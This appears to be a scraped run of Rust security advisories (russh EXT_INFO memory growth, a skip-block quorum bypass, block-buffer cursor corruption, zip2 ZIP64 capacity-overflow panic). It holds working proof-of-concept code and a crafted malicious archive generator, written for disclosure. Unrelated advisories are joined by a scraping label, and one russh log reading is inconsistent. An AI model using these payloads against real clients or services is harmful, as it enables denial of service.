The harness constructs a real client Session in the WaitingAuthRequest pre-auth state (the configuration a client holds while the server is asking for authentication), then feeds attacker-controlled packet bodies to the genuine Session::process_packet dispatch - the same function the network event loop calls - so the retention happens in the production parsing path, not a reimplementation. A counting global allocator measures live heap across packets. The control leg feeds the same packet volume of USERAUTH_BANNER bodies, which parse and dispatch without retention. The test below is added to the russh source tree as russh/src/client/extinfo_poc.rs, with two lines added to russh/src/client/mod.rs next to the existing test module declarations:

#[cfg(test)]
mod extinfo_poc;

cat > russh/src/client/extinfo_poc.rs <<'EOF'
//! PoC: unbounded pre-auth client memory growth
//! via repeated EXT_INFO packets (`received_extensions` accumulates without
//! cap or dedup; russh/src/client/encrypted.rs:handle_ext_info).
//!
//! Drives the REAL client packet parser (Session::process_packet ->
//! handle_ext_info) with attacker-supplied packet bodies over an unmodified
//! client session in the pre-auth state (WaitingAuthRequest). Measuring
//! allocator totals proves the growth is persistent and unbounded across
//! packets. Control leg: equal traffic of IGNORE packets.
//!
//! Run: cargo +stable-x86_64-pc-windows-gnu test -p russh --lib extinfo_poc -- --nocapture

use std::alloc::{GlobalAlloc, Layout, System};
use std::collections::HashMap;
use std::num::Wrapping;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;

use tokio::sync::mpsc::{channel, unbounded_channel};

use super::*;
use crate::auth::{AuthRequest, Method};
use crate::compression::{Compression, Decompress};
use crate::kex::{KEXES, NONE};
use crate::msg;
use crate::session::{CommonSession, Encrypted, EncryptedState, Exchange};
use crate::sshbuffer::PacketWriter;
use crate::{cipher, CryptoVec, mac};

static LIVE: AtomicU64 = AtomicU64::new(0);

struct Counting;

unsafe impl GlobalAlloc for Counting {
    unsafe fn alloc(&self, layout: Layout) -> *mut u8 {
        let p = System.alloc(layout);
        if !p.is_null() {
            LIVE.fetch_add(layout.size() as u64, Ordering::SeqCst);
        }
        p
    }
    unsafe fn dealloc(&self, p: *mut u8, layout: Layout) {
        LIVE.fetch_sub(layout.size() as u64, Ordering::SeqCst);
        System.dealloc(p, layout)
    }
}

#[global_allocator]
static POC_ALLOC: Counting = Counting;

fn live_mb() -> f64 {
    LIVE.load(Ordering::SeqCst) as f64 / (1024.0 * 1024.0)
}

struct PocHandler;

impl Handler for PocHandler {
    type Error = crate::Error;

    async fn check_server_key(
        &mut self,
        _: &PublicKeyOrCertificate,
    ) -> Result<bool, Self::Error> {
        Ok(true)
    }
}

fn poc_session() -> Session {
    let config = Arc::new(Config::default());
    let (sender, receiver) = channel(config.channel_buffer_size);
    let (reply_sender, _reply_receiver) = unbounded_channel();
    let auth_request = AuthRequest::new(&Method::KeyboardInteractive {
        submethods: String::new(),
    });
    Session::new(
        config.window_size,
        CommonSession {
            auth_user: "victimuser".to_owned(),
            auth_attempts: 0,
            auth_method: Some(Method::KeyboardInteractive {
                submethods: String::new(),
            }),
            remote_to_local: Box::new(cipher::clear::Key),
            encrypted: Some(Encrypted {
                state: EncryptedState::WaitingAuthRequest(auth_request),
                exchange: Some(Exchange::default()),
                kex: KEXES.get(&NONE).unwrap().make(),
                key: 0,
                client_mac: mac::NONE,
                server_mac: mac::NONE,
                session_id: CryptoVec::new(),
                channels: HashMap::new(),
                last_channel_id: Wrapping(0),
                write: Vec::new(),
                write_cursor: 0,
                last_rekey: russh_util::time::Instant::now(),
                server_compression: Compression::None,
                client_compression: Compression::None,
                decompress: Decompress::None,
                rekey_wanted: false,
                received_extensions: Vec::new(),
                extension_info_awaiters: HashMap::new(),
            }),
            config,
            wants_reply: false,
            disconnected: false,
            buffer: Vec::new(),
            strict_kex: false,
            alive_timeouts: 0,
            received_data: false,
            remote_sshid: b"SSH-2.0-auditpeer".to_vec(),
            packet_writer: PacketWriter::clear(),
        },
        receiver,
        reply_sender,
    )
}

/// EXT_INFO packet body (russh msg number 7): u32 count, then per extension
/// a name string plus a data blob. Minimal entry = name "x" (5 B) + data
/// empty (4 B) = 9 wire bytes.
fn ext_info_body(entries: usize) -> Vec<u8> {
    let mut b = vec![msg::EXT_INFO];
    b.extend_from_slice(&(entries as u32).to_be_bytes());
    for _ in 0..entries {
        b.extend_from_slice(&1u32.to_be_bytes());
        b.push(b'x');
        b.extend_from_slice(&0u32.to_be_bytes());
    }
    b
}

#[tokio::test]
async fn ext_info_reception_grows_memory_without_bound() {
    let mut handler = PocHandler;

    // ---- control leg: equal packet volume of USERAUTH_BANNER ----
    // (IGNORE is a hard disconnect in this state; banners parse and are
    // forwarded to the handler without retention)
    let mut session = poc_session();
    let banner_body = {
        let data_len = 26990usize; // total ~27 KB, matching the EXT_INFO packet size
        let mut b = vec![msg::USERAUTH_BANNER];
        b.extend_from_slice(&(data_len as u32).to_be_bytes());
        b.resize(1 + 4 + data_len, b'b');
        b.extend_from_slice(&0u32.to_be_bytes()); // empty language tag
        b
    };
    let c0 = live_mb();
    for _ in 0..400 {
        session
            .process_packet(&mut handler, &banner_body)
            .await
            .expect("control packet");
    }
    let control_delta = live_mb() - c0;

    // ---- attack leg: 400 EXT_INFO packets, 3000 entries each ----
    let mut session = poc_session();
    let body = ext_info_body(3000); // ~27 KB per packet
    let a0 = live_mb();
    for i in 0..400 {
        session
            .process_packet(&mut handler, &body)
            .await
            .expect("ext_info packet");
        if i == 0 || i == 99 || i == 199 || i == 299 || i == 399 {
            let n = session
                .common
                .encrypted
                .as_ref()
                .map(|e| e.received_extensions.len())
                .unwrap_or(0);
            println!(
                "EXT_INFO packets processed: {}, received_extensions.len() = {}, live = {:.2} MiB",
                i + 1,
                n,
                live_mb() - a0 + c0 // keep numbers comparable per-process
            );
        }
    }
    let attack_delta = live_mb() - a0;
    let n = session
        .common
        .encrypted
        .as_ref()
        .map(|e| e.received_extensions.len())
        .unwrap_or(0);

    println!(
        "CONTROL leg: 400 USERAUTH_BANNER packets (~{} KB each, same packet volume), retained {:+.2} MiB",
        banner_body.len() / 1024,
        control_delta
    );
    println!(
        "ATTACK leg: 400 EXT_INFO packets x 3000 entries, received_extensions.len() = {}, retained {:+.2} MiB",
        n, attack_delta
    );
    println!(
        "amplification: ~{:.1}x retained per wire byte (input ~{} KB/packet, no cap, no dedup, pre-auth)",
        attack_delta * 1024.0 * 1024.0 / (400.0 * body.len() as f64),
        body.len() / 1024
    );
    assert_eq!(
        n, 1_200_000,
        "every parsed extension name was retained, none were dropped"
    );
    if attack_delta > 10.0 {
        println!(
            "VERDICT: VULNERABLE - {:+.1} MiB retained across packets vs control {:+.2} MiB; growth is unbounded and attacker-renewable pre-auth",
            attack_delta, control_delta
        );
    } else {
        println!(
            "VERDICT: NOT REPRODUCED - attack delta {:+.2} MiB not above threshold",
            attack_delta
        );
    }
}
EOF
cargo test -p russh --lib extinfo_poc --release -- --nocapture

Captured output from executing the v0.64.1 client parser (verbatim from the retained run log, run inside the russh crate checkout; non-evidence compiler warning lines omitted):

running 1 test
EXT_INFO packets processed: 1, received_extensions.len() = 3000, live = 0.28 MiB
EXT_INFO packets processed: 100, received_extensions.len() = 300000, live = 12.47 MiB
EXT_INFO packets processed: 200, received_extensions.len() = 600000, live = 24.75 MiB
EXT_INFO packets processed: 300, received_extensions.len() = 900000, live = 25.04 MiB
EXT_INFO packets processed: 400, received_extensions.len() = 1200000, live = 49.32 MiB
CONTROL leg: 400 USERAUTH_BANNER packets (~26 KB each, same packet volume), retained +0.00 MiB
ATTACK leg: 400 EXT_INFO packets x 3000 entries, received_extensions.len() = 1200000, retained +49.14 MiB

test client::extinfo_poc::ext_info_reception_grows_memory_without_bound ... ok
test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 193 filtered out; finished in 0.24s

Output interpretation: every one of the 1.2 million extension names the server sent was parsed and retained for the life of the session, about 4.8 times the wire bytes, while the same volume of banner traffic retained nothing - the accumulation is specific to the extension handler, not a property of packet volume. The vector is only read, never cleared, so the growth persists across the whole session and renews with every packet. Live-memory readings, timings, and the build hash are instance-specific; the mechanism, uncapped cross-packet accumulation in a pre-auth handler, is the stable verdict.

Impact

Unrestricted resource allocation (CWE-770): any server a russh-based client connects to can grow the client process's memory without bound before the user has authenticated, by sending a stream of ordinary-sized packets, and the memory is never reclaimed for the life of the session; embedding applications that connect to untrusted or compromised servers are drained the same way. A fix is to cap the length of received_extensions (or store it as a bounded set with deduplication), bound the number of EXT_INFO packets accepted before authentication, and align the EXT_INFO message number with RFC 8308 (82) so the handler is unreachable by accident.

items.content_html:
Impact

SkipBlockProof::verify computes its quorum check using BitSet.len(), then iterates BitSet indices and casts each usize index to u16 (slot as u16) for slot lookup. If an attacker can get a SkipBlockProof verified where MultiSignature.signers contains out-of-range indices spaced by 65536, these indices inflate len() but collide onto the same in-range u16 slot during aggregation.

This makes it possible for a malicious validator with far fewer than 2f+1 real signer slots to pass skip block proof verification by multiplying a single BLS signature by the same factor.

Patches

The patch for this vulnerability is included as part of v1.3.0.

Workarounds

No known workarounds.

Summary

A caught panic may leave the cursor position of EagerBuffer or ReadBuffer in a corrupted state; this in turn allows out-of-bounds reads/writes.

Details & PoC

The following two tests fail miri:

#[cfg(miri)]
#[test]
fn eager_digest_blocks_panic_corrupts_inline_position() {
    // `EagerBuffer` stores its cursor in the last byte of the internal block.
    // When `digest_blocks` completes a previously partial block, it overwrites
    // that byte with input data before invoking the caller-provided `compress`
    // callback. If the callback panics, safe code can catch the panic and keep
    // using the buffer while its cursor byte no longer satisfies the internal
    // `pos < block_size` invariant. Under Miri this `get_pos` call reaches the
    // `unreachable_unchecked` used for the assumed-valid cursor.
    let mut buf = EagerBuffer::<U4>::new(&[1, 2]);

    let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        buf.digest_blocks(&[3, 0xff], |_| panic!("simulated compression failure"));
    }));

    let _ = buf.get_pos();
}

#[cfg(miri)]
#[test]
fn read_buffer_generator_panic_corrupts_inline_position() {
    // `ReadBuffer` stores its cursor in `buffer[0]`, but `write_block` gives
    // `gen_block` mutable access to the whole internal block before restoring
    // `buffer[0]` to a valid cursor. If `gen_block` writes an arbitrary first
    // byte and panics, safe code can catch the panic and later observe an
    // invalid cursor. Under Miri this `get_pos` call reaches the
    // `unreachable_unchecked` used for the assumed-valid cursor.
    let mut buf = ReadBuffer::<U4>::default();

    let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        buf.write_block(
            1,
            |block| {
                block[0] = 0xff;
                panic!("simulated block generation failure");
            },
            |_| {},
        );
    }));

    let _ = buf.get_pos();
}

They fail on an unreachable_unchecked!() under the invariant for the pos to always be within bounds of the block.

Impact

While the byte that overwrites pos may come from untrusted input and is therefore attacker-controlled, this still relies on the surrounding code catching the panic and carrying on, which should be uncommon in practice.

For this to be exploitable, the attacker also needs a way to trigger a panic here; I have not investigated how feasible that is.

Credits

The issue was discovered by GPT-5.5

References

  • https://github.com/RustCrypto/utils/security/advisories/GHSA-qwgh-2vcv-g2f7
  • https://github.com/RustCrypto/utils/releases/tag/block-buffer-v0.12.1
  • https://github.com/advisories/GHSA-qwgh-2vcv-g2f7

Summary

A malicious 149-byte ZIP archive can cause a denial of service in applications that enable legacy-zip and use ZipArchive::extract(). An attacker-controlled ZIP64 uncompressed size triggers a capacity overflow panic in the Shrink decoder in optimized builds, potentially terminating the affected process.

Details

When reading a Shrink-compressed entry, ShrinkDecoder::read() buffers the compressed input and reserves output capacity using the entry's declared uncompressed size:

if !self.stream_read {
    self.stream_read = true;
    let mut compressed_bytes = Vec::new();
    self.compressed_reader.read_to_end(&mut compressed_bytes)?;
    self.stream.reserve(self.uncompressed_size as usize);
    hwunshrink(
        &compressed_bytes,
        self.uncompressed_size as usize,
        &mut self.stream,
    )?;
}

In version 8.6.0, this is located in src/legacy/shrink.rs. The vulnerable legacy codecs are compiled when the legacy-zip Cargo feature is enabled.

self.uncompressed_size is populated from ZIP metadata. For ZIP64 entries, an attacker can set it to a 64-bit value independently of the archive's actual compressed payload size. The PoC declares an uncompressed size of u64::MAX, while supplying only one byte of compressed data.

The reserve occurs before hwunshrink() can validate or decode the compressed stream. Consequently, the impossible capacity causes a deterministic capacity overflow panic instead of returning a normal archive or I/O error. The behavior also occurs in optimized release builds and is reachable through ZipArchive::extract().

The same unbounded allocation pattern is present in the legacy Reduce and Implode decoder implementations. This PoC specifically demonstrates the Shrink path.

PoC

Create a new Cargo project with the following layout:

zip2-legacy-poc/
|-- Cargo.toml
`-- src/
    `-- main.rs

Use this Cargo.toml:

[package]
name = "zip2-legacy-poc"
version = "0.1.0"
edition = "2024"
publish = false

[dependencies]
tempfile = "3"
zip = { version = "=8.6.0", features = ["legacy-zip"] }

Use this src/main.rs:

use std::fs::File;
use std::io::{Cursor, Write};

fn push16(out: &mut Vec<u8>, value: u16) {
    out.extend_from_slice(&value.to_le_bytes());
}

fn push32(out: &mut Vec<u8>, value: u32) {
    out.extend_from_slice(&value.to_le_bytes());
}

fn push64(out: &mut Vec<u8>, value: u64) {
    out.extend_from_slice(&value.to_le_bytes());
}

fn zip64_extra() -> Vec<u8> {
    let mut extra = Vec::new();
    push16(&mut extra, 0x0001);
    push16(&mut extra, 16);
    push64(&mut extra, u64::MAX);
    push64(&mut extra, 1);
    extra
}

fn archive() -> Vec<u8> {
    let name = b"entry";
    let extra = zip64_extra();
    let mut out = Vec::new();

    push32(&mut out, 0x0403_4b50);
    push16(&mut out, 45);
    push16(&mut out, 0);
    push16(&mut out, 1); // Shrink compression.
    push16(&mut out, 0);
    push16(&mut out, 0);
    push32(&mut out, 0);
    push32(&mut out, u32::MAX);
    push32(&mut out, u32::MAX);
    push16(&mut out, name.len() as u16);
    push16(&mut out, extra.len() as u16);
    out.extend_from_slice(name);
    out.extend_from_slice(&extra);
    out.push(0);

    let central_start = out.len() as u32;

    push32(&mut out, 0x0201_4b50);
    push16(&mut out, 45);
    push16(&mut out, 45);
    push16(&mut out, 0);
    push16(&mut out, 1); // Shrink compression.
    push16(&mut out, 0);
    push16(&mut out, 0);
    push32(&mut out, 0);
    push32(&mut out, u32::MAX);
    push32(&mut out, u32::MAX);
    push16(&mut out, name.len() as u16);
    push16(&mut out, extra.len() as u16);
    push16(&mut out, 0);
    push16(&mut out, 0);
    push16(&mut out, 0);
    push32(&mut out, 0);
    push32(&mut out, 0);
    out.extend_from_slice(name);
    out.extend_from_slice(&extra);

    let central_size = out.len() as u32 - central_start;

    push32(&mut out, 0x0605_4b50);
    push16(&mut out, 0);
    push16(&mut out, 0);
    push16(&mut out, 1);
    push16(&mut out, 1);
    push32(&mut out, central_size);
    push32(&mut out, central_start);
    push16(&mut out, 0);
    out
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let bytes = archive();
    File::create("poc.zip")?.write_all(&bytes)?;

    let mut archive = zip::ZipArchive::new(Cursor::new(bytes))?;
    let entry = archive.by_index(0)?;

    println!(
        "method={:?} declared_size={}",
        entry.compression(),
        entry.size()
    );

    drop(entry);

    let output = tempfile::tempdir()?;
    archive.extract(output.path())?;
    Ok(())
}

Run the reproducer in release mode:

cd zip2-legacy-poc
RUST_BACKTRACE=1 cargo run --release

Observed output with zip 8.6.0 on x86_64-unknown-linux-gnu:

method=Shrink declared_size=18446744073709551615

thread 'main' panicked at .../alloc/src/raw_vec/mod.rs:
capacity overflow

The backtrace reaches the Shrink decompressor through std::io::copy and ZipArchive::extract_internal(). The process exits with status 101. The program also writes the generated 149-byte archive to poc.zip before triggering extraction.

Impact

Applications that enable legacy-zip and pass attacker-supplied ZIP files to the following extraction API can be forced to panic before the compressed entry is validated or decoded. An unhandled panic may terminate the archive-processing process and cause a denial of service.

  • zip::read::ZipArchive::extract

References

  • https://github.com/zip-rs/zip2/security/advisories/GHSA-9hj8-73fh-9963
  • https://nvd.nist.gov/vuln/detail/CVE-2026-115907
  • https://github.com/zip-rs/zip2/pull/991
  • https://github.com/zip-rs/zip2/commit/8b4991288b79ad11cce201c2d785d5baa795bd3e
  • https://github.com/zip-rs/zip2/releases/tag/v9.0.0
  • https://github.com/advisories/GHSA-9hj8-73fh-9963
